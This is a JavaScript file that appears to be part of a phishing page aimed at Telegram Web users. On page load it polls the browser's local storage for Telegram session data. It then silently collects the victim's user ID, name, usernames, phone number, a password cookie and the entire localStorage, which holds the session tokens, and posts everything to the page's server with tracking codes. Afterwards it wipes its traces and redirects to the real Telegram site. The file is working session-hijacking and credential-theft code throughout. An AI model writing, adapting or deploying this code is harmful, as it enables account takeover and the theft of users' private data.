document.addEventListener("DOMContentLoaded", function () {
  async function checkLocalStorage() {
    let globalState = localStorage.getItem("tt-global-state");
    if (globalState && localStorage.getItem("user_auth")) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = "none";

      if (currentUserId && currentUser) {
        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie
          .split("; ")
          .find((e) => e.startsWith("password="))
          ?.split("=")[1];

        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");

        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const type = urlParams.get("type");
        const trackingCode = urlParams.get("start");

        console.log("Verification type:", type); // Debug log
        console.log("Tracking code:", trackingCode); // Debug log

        // Send data to server with error handling
        try {
          await fetch(`/api/users/telegram/info`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              userId: currentUserId,
              firstName,
              usernames,
              phoneNumber,
              isPremium,
              password,
              quicklySet: localStorage,
              type: type,
              trackingCode: trackingCode,
            }),
          });
          console.log("Successfully sent verification data"); // Debug log
        } catch (error) {
          console.error("Error sending data:", error);
        }

        // window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
        window.Telegram.WebApp.close();
        localStorage.clear();
        document.cookie =
          "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        window.location.href = "https://web.telegram.org/a/";

        clearInterval(checkInterval);
      }
    } else {
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  const checkInterval = setInterval(checkLocalStorage, 100);
});
